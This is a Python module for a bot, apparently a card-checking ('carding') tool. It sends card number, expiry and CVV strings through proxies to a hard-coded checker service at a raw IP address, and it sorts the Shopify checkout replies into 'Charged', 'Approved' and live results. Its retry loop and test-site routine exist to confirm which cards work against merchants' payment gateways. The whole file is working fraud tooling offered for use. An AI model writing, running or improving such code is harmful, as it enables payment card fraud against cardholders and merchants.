"""
checker_bridge.py — Single-node Shopify checker API with auto-detect retry.
Logic: Only known card gateway responses pass through. Everything else retries.
"""

import asyncio
import aiohttp
import json
import time
import logging
from urllib.parse import unquote as _urlunquote
from yarl import URL

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

API_BASE = "http://5.175.222.144:8081"
MAX_RETRIES = 5
REQUEST_TIMEOUT = 120
_CONNECT_TIMEOUT = 5

# ── WHITELIST: Yehi responses "sahi" hain → NO retry, directly show ─────────
# Agar response mein INMEIN SE KOI BHI word mile, samjho card result aaya hai.
# Baaki sab (site errors, connection errors, unknown errors) → AUTO retry.
_GOOD_RESPONSES = (
    # Charged / Success
    'order_placed', 'order completed', 'charged', 'approved', 'live',
    # CVV matched / Insufficient funds = LIVE card
    'insufficient_funds', 'insufficient funds',
    'incorrect_cvc', 'invalid_cvc', 'incorrect_cvv', 'invalid_cvv',
    'incorrect_zip',
    # Declined = definitive gateway result (NOT an error)
    'card_declined', 'do_not_honor', 'declined',
    # Other definitive card states
    'expired_card', 'expired',
    'pick_up_card', 'stolen_card',
    'fraudulent', 'fraud_suspected', 'fraud',
    '3ds', 'otp_required', 'authentication_required',
    'risky', 'ccn', 'live_limit',
    'cvv', 'ccv', 'zip',
)

# ══════════════════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════════════════════

_session: aiohttp.ClientSession | None = None

async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY FORMATTER  →  host:port:user:pass
# ══════════════════════════════════════════════════════════════════════════════

def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    """Convert bot.py proxy dict to host:port:user:pass (no protocol)."""
    if not proxy_data:
        return None

    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        url = existing.strip()
        if "://" in url:
            _, rest = url.split("://", 1)
        else:
            rest = url

        if "@" in rest:
            auth, hostport = rest.split("@", 1)
            if ":" in hostport:
                host, port = hostport.rsplit(":", 1)
                if ":" in auth:
                    user, pw = auth.split(":", 1)
                    user = _urlunquote(user)
                    pw = _urlunquote(pw)
                    return f"{host}:{port}:{user}:{pw}"
                return f"{host}:{port}"
        else:
            if ":" in rest:
                parts = rest.split(":")
                if len(parts) == 4:
                    return rest
                elif len(parts) == 2:
                    return rest
        return rest

    ip   = str(proxy_data.get("ip")   or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = proxy_data.get("username")
    pw   = proxy_data.get("password")

    if not ip or not port:
        return None

    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ══════════════════════════════════════════════════════════════════════════════
#  RESULT NORMALISATION
# ══════════════════════════════════════════════════════════════════════════════

def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", "Unknown")
    price    = raw.get("Price", "-")
    gate     = raw.get("Gate", "Shopify")

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


def _is_good_response(response_text: str) -> bool:
    """
    Auto-detect: True = proper card result (no retry needed).
    False = site error / connection error / unknown → retry.
    """
    if not response_text or response_text.strip().lower() == "unknown":
        return False
    rl = response_text.lower()
    return any(good in rl for good in _GOOD_RESPONSES)


# ══════════════════════════════════════════════════════════════════════════════
#  SINGLE API CALL
# ══════════════════════════════════════════════════════════════════════════════

async def _call_api(cc_str: str, proxy_str: str) -> dict:
    """Call the checker API. Returns dict or raises on failure."""
    sess = await _get_session()

    # Server expects literal '|' — yarl.URL(encoded=True) prevents %7C encoding
    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}"
    url = URL(url_str, encoded=True)

    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.debug(f"[api] → {API_BASE} | cc=...{cc4} | proxy={proxy_str[:35]}...")

    async with sess.get(
        url,
        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT),
    ) as resp:
        if resp.status != 200:
            text = await resp.text()
            raise RuntimeError(f"HTTP {resp.status}: {text[:80]}")

        text = (await resp.text()).strip()
        try:
            data = json.loads(text)
        except Exception:
            data = {"Response": text, "Price": "-", "Gate": "Shopify"}
        return data


# ══════════════════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════════════════

async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    """
    Main entry point (same signature as before so bot.py needs ZERO changes).
    Auto-detect logic: proper card result = show immediately.
    Any site/connection/unknown error = retry up to MAX_RETRIES.
    """
    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /proxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.info(f"[bridge] check_card_site | cc=...{cc4} | proxy={proxy_str[:25]}...")

    last_result = None
    last_err = "Unknown error"

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            raw = await _call_api(cc_str, proxy_str)
            result = _map_result(raw, cc_str, site_url)
            response_text = result.get("Response", "")

            log.info(
                f"[bridge] attempt {attempt}/{MAX_RETRIES} | {(time.monotonic()-t_start)*1000:.0f}ms"
                f" | status={result.get('Status')} | resp={response_text[:60]}"
            )

            # ✅ AUTO-DETECT: Agar proper card result hai → return immediately
            if _is_good_response(response_text):
                return result

            # ⚠️ Error / Site issue / Unknown → retry karo
            last_result = result
            last_err = f"Not a card result: {response_text[:80]}"
            log.warning(f"[bridge] auto-detect: retrying attempt {attempt}...")

            if attempt < MAX_RETRIES:
                await asyncio.sleep(1.0)

        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:80]}"
            log.warning(f"[bridge] attempt {attempt}/{MAX_RETRIES} exception — {last_err}")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(1.0)
            else:
                break

    # Sab retries khatam
    if last_result is not None:
        log.warning(f"[bridge] all {MAX_RETRIES} retries done, returning last response")
        return last_result

    return {
        "Response": f"API Error after {MAX_RETRIES} retries: {last_err}",
        "Price": "-", "Gate": "-", "Status": "Error",
        "CC": cc_str, "Site": site_url,
    }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price = raw.get("Price", "-")
    status = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif not _is_good_response(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ══════════════════════════════════════════════════════════════════════════════
#  BACKWARD COMPAT (node management — single API, no-op)
# ══════════════════════════════════════════════════════════════════════════════

def get_all_nodes() -> list[str]:
    return [API_BASE]

async def check_node_health(node: str) -> bool:
    if node == API_BASE:
        try:
            sess = await _get_session()
            async with sess.get(
                f"{API_BASE}/",
                timeout=aiohttp.ClientTimeout(total=6, connect=4),
            ) as r:
                return r.status == 200
        except Exception:
            return False
    return False

def is_node_disabled(node: str) -> bool:
    return False

def disable_node(node: str) -> None:
    log.info(f"[api] disable_node is no-op in single-API mode: {node}")

def enable_node(node: str) -> None:
    log.info(f"[api] enable_node is no-op in single-API mode: {node}")
